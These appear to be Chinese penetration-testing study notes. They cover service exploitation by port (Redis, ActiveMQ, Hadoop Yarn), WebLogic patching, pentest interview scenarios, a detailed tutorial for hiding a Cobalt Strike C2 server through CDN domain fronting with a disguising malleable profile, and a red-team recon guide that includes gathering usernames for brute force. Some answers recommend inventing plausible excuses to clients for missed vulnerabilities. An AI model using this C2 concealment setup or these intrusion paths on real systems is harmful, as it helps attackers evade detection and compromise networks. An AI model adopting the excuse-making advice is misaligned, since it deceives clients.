\1) 22端口一般时LINUX服务器的SSH远程登陆协议，一般也采用爆破的方法。

\2) 8088Hadoop Yarn资源管理系统REST API存在未授权漏洞。通过curl -v -X POST申请新的application，构造提交任务后即可在相应目录生成webshell。

\3) 8161运行着Apache ActiveMQ。其Console存在默认端口和默认密码/未授权访问(默认密码为admin:admin)。当ActiveMQ开启PUT请求时(默认开启)，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息。ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。ActiveMQ除了支持PUT协议之外，还支持MOVE协议，可导致任意文件移动漏洞。其还存在CVE-2015-5254 反序列化等漏洞。

\4) 6379是redis数据库的开放端口。Redis因配置不当可以导致未授权访问。通过连接redis（./redis-cli -h IP），可实现写入webshell，写入crontab计划任务反弹shell，以及写入ssh公钥，获取操作系统权限。其端口也可被暴力破解。

## weblogic CVE-2019-2725漏洞描述与让客户满意的修复方案

漏洞描述 ：由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。

修复建议 ： 官方目前已发布针对此漏洞的紧急修复补丁，可以采取以下4种方式进行防护。

\1. 及时打上官方CVE-2019-2725补丁包官方已于4月26日公布紧急补丁包，下载地址：https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline

\2. 升级本地JDK版本因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。

\3. 配置URL访问控制策略部署于公网的WebLogic服务器，可通过ACL禁止对/_async/及/wls-wsat/路径的访问。

\4. 删除不安全文件删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。具体文件路径如下：10.3.*版本:

## 假设客户给到你有50万个ip，并要求你两周内做完全端口扫描，你会如何应对或如何实施（从两方面回答：1.如何对客户要求做出解释并合理调整。2.如何提高全端口扫描效率，既保证速度，又保证准确率）

首先客户提出提出两周50w个ip全端口这个肯定不现实，所以要考虑跟客户解释，有必要对扫描任务进行时间调整，安排尽可能多的扫描资源，如扫描机器，扫描网络带宽等 ，参考扫描100个IP端口的平均时长，估计扫完的时间，给出30天时间左右答复，并且留出一周进行后续补扫，文档整理等

使用到 多线程 分布式 和 高并发 ,采用masscan + nmap 先masscan存活过一遍，把未存活IP剔除掉；使用分布式nmap高并发过一遍端口，也可以massacn端口扫描过一遍，在nmap进行探测

提高扫描速度 由于IP数量过多，不能直接把所有的IP都丢上去扫，时间肯定不够 可以跟客户商量减少IP数量，对未存活的IP进行筛选过滤 加快扫描速度需要进行参数微调，如--min-hostgroup、--min-rate和--min-parallelism 对于存在防火墙的情况，可以提出需要提供扫描器，最好的墙内扫

数据整理 对于大量的list和json使用python-nmap python-masscan，扫描1个IP处理1个IP

不推荐做法

老油条混子做法：行，没问题，别说五十万个了五百万个都能完成，接活的时候明确的说时间紧，任务重，可能会存在误报，问客户接不接受，接受了就开始扫。 masscan先过一遍，过滤掉一批死ip和只有80，443，8080，8443，等web的 然后高并发，分布式nmap过一批常用端口，把有结果的过滤出来 然后把没结果再跑一遍全端口，交差 后面扯皮的时候也能扯，前期也明确说了存在误报

## 安全任务结束后，发还结果给A公司，A公司经过检查后发现某个漏洞没有出现在结果里，被遗漏了。经检查后发现确实是我方当时没有扫描出来，如何跟客户解释和处理？

考察沟通能力， 首先安抚客户情绪, 直接先给结论不合适，可以先表示我们进行核查后反馈，然后扫描的漏洞进行复扫再分析, 接下来就是找有理有据经得起推敲的理由来合适圆场

先确认该漏洞是否存在

如果漏洞存在

也就是我们没扫出来，就需要检查当时资产是否存活，是不是关停又开起来，是不是因为当时网络不好，带宽不够大，网络波动大，外网环境不稳定、WAF拦截等，先稳住客户情绪，让客户相信我们是有能力的，只是偶尔因为不可控因素出现了问题 然后提供补救方案，进行补扫等后续方案

如果漏洞扫不出来 换个扫描器，比较差异，如果还是扫不出来的话，就要考虑优化方案，看要不要立个专项检测来单独对此漏洞进行批量排查。 如果实在是我们的问题，找不到理由圆场的话，我们就老实承认, 找客户经理进行沟通，提出不足并且要有改进的方案等, 考虑如何给客户一个满意的交代，确保下次不会再出现此类问题

## 扫描任务结束后将结果发给A公司，A公司对其中的一类型漏洞表示疑惑：认为自己没有办法修复此类漏洞（比较积极的专业公司），向我方询问，并想要我方帮忙修复漏洞。此场景应该怎么处理？

考察责任划分问题，原则上是不允许直接操作客户公司的机器，以及 对于客户机器权限需要特别谨慎对待（能不要就不要）, 我们负责解释漏洞这方面的事宜，并且积极的提供整改建议，并不能直接或者间接操作客户机器。

其次考验客户想让我们直接修复漏洞的处理方式，这种情况会经常出现在我们的日常工作中，我们要说明职责范围: 我们只负责解释漏洞描述和原理以及修复建议，他们负责整改. 我们对系统业务不熟悉，我们亲自修复话出现风险和问题也是我们承担不了的。

## 某专业公司A公司安全项目，跟专业公司A谈妥后完成了外网扫描任务，现在进行内网扫描。由于业务量比较大安排在晚上下班后进行扫描。第一天扫描晚上9点由于不明原因导致A专业公司所有系统无法访问，被专业公司A的人询问情况， 第二天检查原因发现，是因为所有流量是经过VPN到达主机，导致进出口VPN网关堵塞，业务无法正常访问，请问被专业公司A的人询问情况如何应急处理？判断原因并说明后续如何开展扫描任务？

考查应急处理和客户沟通，首先调解客户情绪，跟客户沟通，立马停止扫描以恢复业务系统正常，并告知A公司进行排查原因，检查网络与主机情况。

其次考察网络知识，既然流量通过VPN会进行堵塞，想办法绕过此VPN或者降速，这里要求提供内网扫描机器进行扫描即可，但需要吸取上次经验扫描前进行扫描测试，如在中午休息的时候进行探测性扫描，测压。然后在晚上再进行扫描，扫描时需要A公司派网管人员帮忙查看系统状况是否正常。

## 流量分析：webshell流量交互的流量特征有哪些（列举3个特征来简略描述）

webshell是用来控制服务器的，在控制服务器的过程中，就会触发许多 系统函数 ,例如eval、z0（菜刀特征）、shell，需监控这些关键的函数，具体需要查看是哪个网页发起的请求进行鉴别

除此之外，webshell连接可能使用 base64编码，正常功能也会使用base64容易引起误报，一般与eval数量对比，数量差异较小时可能被上传webshell进行编码通讯

除了系统函数、base64编码通讯外，还存在int_set("display_errors","0"), 为webshell流量特征之一

还可以监控ifconfig whoami ipconfig等关键命令，这是获得webshell后基本上都会执行的命令

# 教你配置一个域前置C2隐藏——超详细过程小白理解

## 域前置C2隐藏

### 简介

域前置（Domain fronting），在红蓝攻防中已经不是一种新技术了，但是依旧实用。它是一种能够隐藏连接真实端点来规避互联网审查的技术。

在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。

此技术的原理为在不同通信层使用不同的域名：

· 在明文的DNS请求和TLS服务器名称指示（SNI）中使用无害的域名来初始化连接、公布给审查者

· 实际要连接的"敏感”域名仅在建立加密的HTTPS连接后发出，使其不以明文暴露给网络审查者

### 原理

假设我们执行以下一种命令：

curl https://www.allow.com -H "Host: www.forbidden.com" -vcurl https://1.1.1.1 -H "Host: www.forbidden.com" -v ##1.1.1.1为CDN的IP

结果是，*客户端实际通信的对象是www.forbidden.com，但在流量监控设备看来，客户端是在与www.allow.com通信，即客户端将流量成功伪装成了与www.allow.com通信的流量\*

其工作原理如下图所示：

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps93.jpg)image

在curl https://www.allow.com -H "Host: www.forbidden.com" -v 时，用户用合法的域名allow.com向DNS请求CDN的IP，然后向CDN发起请求，这一步自然是没有任何问题的

因为在处理HTTPS请求时，CDN会首先将它解密，并根据HTTP Host_Header的值做请求转发。

所以用户想要访问一个非法网站www.forbidden.com，可以使用一个CDN上的合法的域名www.allow.com作为SNI，然后使用www.forbidden.com作为HTTP Host与CDN进行HTTPS通信

由于HTTP Host只能被转发看到，而审查者是看不到的，故CDN会放过这条请求，并将HTTP请求根据HTTP Host重新封装，发往www.forbidden.com的服务器，所以，审查者是看不见这个forbidden的

*因此，域前置技术的核心基础设施是CDN\*。

那我们只要给我们的C2服务器套上CDN即可。

### 环境的准备

· 一个域名

· 一个VPS

· 一个CDN服务厂商

#### 1.域名购买

域名可以在porkbun上购买

https://porkbun.com/

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps94.jpg)image

#### 2.VPS购买

https://my.vultr.com/

VPS推荐在Vultr上购买，现在大概5$/month

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps95.jpg)image

支持支付宝支付

#### 3.CDN选择

https://www.cloudfare.com/

CDN就用Cloudfare，重点是免费，有个邮箱就能注册

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps96.jpg)image

#### 4、套CDN

主页选择添加站点，就添加我们刚才购买的域名

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps97.jpg)image

然后在porkbun将我们域名的权威名称服务器修改为以上两个名称

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps98.jpg)image

等个几分钟Cloudfare会发邮件给我们，表示已经绑定上了他的权威名称服务器，可以添加DNS记录了

选中导航栏的DNS，在DNS中添加A记录为我们的VPS的IP

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps99.jpg)image

试一下我们的Host有没有被定位到

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps100.jpg)image

成功了，接下来我们在VPS上部署CS

## C2服务器部署

### 部署CS

(Ubuntu环境)安装java8或者java11

sudo apt-get install openjdk-8-jdk

测试安装，安装成功

java -version

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps101.jpg)

### CobaltStrike安装

将CobaltStrike上传到我们的VPS，给整个文件夹赋予执行权限

chmod -R 755 CoboltStrike4.3/

然后编辑teamserver配置运行端口和密码

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps102.jpg)

### 运行teamserver

.\teamserver [IP] [密码] [c2配置文件]

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps103.jpg)

成功开启服务

客户端运行start.bat

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps104.jpg)

成功连接

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps105.jpg)

### 修改C2配置文件

在当前目录创建一个C2 profile——c2.profile，其中需要替换掉host Header为我们刚才绑定的域名

\# make our C2 look like a Google Web Bug# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting## Author: @armitagehacker http-get {  set uri "/__utm.gif";  client {    parameter "utmac" "UA-2202604-2";    parameter "utmcn" "1";    parameter "utmcs" "ISO-8859-1";    parameter "utmsr" "1280x1024";    parameter "utmsc" "32-bit";    parameter "utmul" "en-US";     header "Host" "*.cloudfront.net";     metadata {      netbios;      prepend "__utma";      parameter "utmcc";    }  }   server {    header "Content-Type" "image/gif";     output {      ## hexdump pixel.gif      ## 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00      ## 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00      ## 0000020 01 00 01 00 00 02 01 44 00 3b       prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";      prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";      prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";       print;    }  }} http-post {  set uri "/___utm.gif";  client {    header "Content-Type" "application/octet-stream";     id {      prepend "UA-220";      append "-2";      parameter "utmac";    }     parameter "utmcn" "1";    parameter "utmcs" "ISO-8859-1";    parameter "utmsr" "1280x1024";    parameter "utmsc" "32-bit";    parameter "utmul" "en-US";     header "Host" "*.cloudfront.net";     output {      print;    }  }   server {    header "Content-Type" "image/gif";     output {      prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";      prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";      prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";      print;    }  }} ## dress up the staging process toohttp-stager {  server {    header "Content-Type" "image/gif";  }}

### 创建完使用c2lint文件检查该配置文件

.\c2lint c2.profile

如下则检查通过

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps106.jpg)image

重新启动teamserver

.\teamserver [IP] 123456 c2.profile

到这里就配置完了，下面进行验证

### 结果验证

新建listenner

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps107.jpg)image

生成相应的payload

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps108.jpg)image

成功上线

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps109.jpg)image

我们用wireshark抓流量看下，是否真的隐藏了我们的C2

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps110.jpg)image

只能看见同一CDN上的高信誉域名，说明我们在监听过程中一定程度地隐蔽了真实攻击机地址

OK，到此我们的域前置就配置成功了

# 红队信息收集(给你一个公司名字)

## 企业信息收集

拿到一个目标，不考虑钓鱼的情况下。如果正常从web入手，至少需要收集以下的信息。

### 1、公司级别

（1）公司的域名

（2）公司的子域名

（3）全资子公司（可能从下级单位打上去，但是光打了下级算不算分得看裁判和规则怎么评估）

（4）公司的ip信息（大公司可以直接跑C段）

一般经过上面的收集以后，我们能够获取到一系列的ip，域名信息。此时需要针对这些进行排除（比如说云上的资产等或者存在cdn的资产，cdn需要寻找真实ip绕过云waf，云上很可能触发告警要小心一点）。

2、ip级别

当我们拿到了一系列的ip和域名以后，对于已经确定的ip，需要进行至少一下的信息收集

（1）ip是否为真实ip

（2）ip开启了哪些端口，可能存在哪些漏洞（外网redis有时候看到的多，但是真实情况下碰到的确实不多，很多时候其实都是web和钓鱼撕开口子的）

（3）对于web，至少需要收集框架，路径，登录接口，js中的敏感信息，网站中间件，服务器操作系统等。大多数时候其实都是文件上传，直接rce或者寻找到了敏感信息等拿下来的，对于之前碰到过一次有个队伍打供应链下载源码审计的这种属于非常态暂不讨论。

3、用户级别

（1）用户级别主要是涉及拿到一些用户的用户名等。便于进行暴力破解。这种说的少点因为太多了，github，google语法，官网，看官网邮箱格式，根据公司名字猜，还有公告里泄露人名，以及一些通用的如公司首字母+数字等。

下面对一些收集的方法进行具体的说明。

公司级别

获取目标域名

（1）直接百度公司，看看有无官网，官网一般是主域名（2）查看天眼查，企查查，域名备案等获取主域名（3）利用whois查询，whois反查获取域名相关信息（4）利用app查询公司的域名。（5）利用股权穿刺图查看公司的子公司域名

http://whois.chinaz.com/ //whois查询

https://beian.miit.gov.cn/ // 域名备案查询

https://www.qcc.com/ //企查查

https://www.qixin.com/ //启信宝

http://icp.chinaz.com/ //站长工具

https://www.tianyancha.com/ //天眼查

https://aiqicha.baidu.com/ //爱企查

说一个小的tips，这里没有提到搜索引擎，可以再fofa或者zoomeye shodan上面查一下公司名字

因为更新的原因可能有些时候域名等无法访问以及更换了，但是ip段还在，如果找到了ip，也能跑一下C段，说不定可以拿到主域名，拿到主域名的原因是在于跑一下子域名。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps111.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps112.jpg)

当我们拿到域名以后。先不要急着跑子域名。可以看一下ip的信息。

这个其实很好说，全球ping一下看看有无cdn，搜索一下ip看看是否属于某某云。

http://ping.chinaz.com/www.zswater.com //全球ping

https://wepcc.com/ //全球ping

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps113.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps114.jpg)

获取目标子域名

拿到了主域名，子域名肯定是必不可少要跑的。

上面叫先拿ip，是因为我们可以结合真实ip的C段，更精确的判断出域名的相关信息，尽可能少的漏掉。

这里我比较喜欢用下面的几个工具

https://github.com/shmilylty/OneForAll //比较自动化，收集的比较全，使用方便

https://github.com/knownsec/ksubdomain //自动化，收集比较全

https://github.com/0x727/ShuiZe_0x727 //使用方便，自动化，集成工具

有机会的话对于app等也抓一下域名信息。

对于一些自定义字典爆破的特殊情况就不说了，这里只说常用的。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps115.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps116.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps117.jpg)

获取目标ip

收集到现在，不出意外我们手上应该是有一堆域名信息了。

一个个判断略显麻烦，这里已经有师傅为我们做好了域名转化为ip的工具，同时能够将C段整理出来。

https://github.com/EdgeSecurityTeam/Eeyes

都到了这里了，可以尝试扫描一下c段，因为有ehole能够直接整理出重点资产，比较方便。推荐的扫描工具https://github.com/shadow1ng/fscan //内网可用，外网也可以用

https://github.com/Adminisme/ServerScanhttps://github.com/EdgeSecurityTeam/EHole这里可能会存在一些cdn，需要真实ip的可能。

一般我比较常用的是找子域名和icon，以及ssl证书等，历史记录感觉碰到的不多，还不如fofa大法去搜搜。

或者是直接子域名再扫个C段等等。这个方法很多我就不献丑了。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps118.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps119.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps120.jpg)

获取目标web信息

上两步，我们基本是拿到了目标的ip段，域名，现在就要尝试对网站进行判断了。

推荐先用ehole走一下识别出重点资产。然后再判断。

https://github.com/broken5/WebAliveScan //web存活判断

（1）收集web的框架信息，一般我采用下面几种手法

《一》识别网址框架:

https:*//scan.dyboy.cn/web/*https:*//fp.shuziguanxing.com/#/*火狐插件wappalyzer其他

利用web的js里面可能会泄露web框架的相关信息，或者根据网站的图标，错误页面，下方的开发公司等去确定网站可能采用了什么框架。

《二》路径收集https://github.com/maurosoria/dirsearch //dirsearchdirbuster //kali自带burp爆破自定义的字典 //需要平时收集或者再github上找字典（主要还是可能有些网站他有自己的路径格式，工具不一定能跑出来）

《三》敏感信息收集

js中的敏感文件

JSfinder：https://github.com/Threezh1/JSFinder

查看开发者工具中js，然后对于一些js文件搜索password username等关键字（这需要直接，有可能会js泄露一些用户名，这是工具跑不出来的）网站内容的敏感数据

这种对有些ZF很有用。经常会碰到邮箱账号密码都写在主页里的。所以对于一些文章啊，可以浏览一些。

说不定也能看到一些收购计划之类的，扩大我们的攻击面。路多了总有一条能走通。这里没用吧端口说出来，因为我们前面已经收集了。

一些中间件一类的是顺带就可以看的，操作系统类的也是能拿了shell才考虑的事情。当然一些shiro等还是要熟悉，这是HW的大杀器。

《四》后台收集这里专门把后台收集提出来，是因为后台并不是说路径扫完了没了就没有了。有可能字典不包含。碰到这种情况，可以尝试以下方法。

（1）可以去搜一下有没有相同的框架说明文档看看后台地址。（2）根据他网站文件的命名格式去看一下有没有可能重名。（3）在网页上看看有没有暴露出后台的接口（4）在js中搜一下admin,system等关键字看看能不能拼接处后台地址。（5）根据url地址，直接把user改为admin等等。

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps121.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps122.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps123.jpg)

当到了这一步的时候，我们基本上对于我们的目标打点以及资产还是不少了。对了还有APP的没说，APP渗透我做的不多，所以这里就找了几个搜索APP信息的工具

https://github.com/kelvinBen/AppInfoScanner app敏感信息收集百度一下网盘查询，找几个进去看看（可以看看是否泄露了源码，但是实际没碰到过这种情况，适用于想直接getshell,失败的情况下。)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps124.jpg)

对于可能需要爆破的，用户名的收集，这一块我一般都是字典直接爆破的。要收集的话我的思路是以下，如果有补充和修正欢迎指点一下：

（1）再网页上直接找用户名（因为一般都有邮箱之类的，这里你能拿到用户名，根据公司名称或者数字生成相应的字典）

（2）利用google语法，搜索xlsx等，或者直接搜这个公司相关的，可能会出现用户名

（3）github上找一下这个公司看看有没有啥泄露的

（4）招聘网站上看看，面试官之类的可能会泄露电话号码，用户名，根据电话号码查用户名

（5）搜索公司的架构图，如果有领导的记下来

（6）利用公众号，微博等社交软件搜索公司的信息。

（7）百度图片（这个看运气了，有时候网页搜出来太多了，直接看看百度图片，有可能出现用户名 筛选起来也很快，是我在之前某次攻防中需要找到一个编号的时候想到了，但是编号打码太模糊了看不清楚）

（8）找一下常用用户名的字典进行收集。

大概就想到这么多吧，其他的再实战中碰到了再说。

常规的思路其实已经够用了，比较骚的思路都是走投无路的时候抓破头颅整出来的，所以不管碰到什么情况，多动动小脑筋。信息收集多做一点，实在不行曲线救国打打供应链能脱下来源码也不错（但是这种比较适用于地方ZF用的小供应商的代码，比较大的要你那么短时间审计出来难度也太大了。）
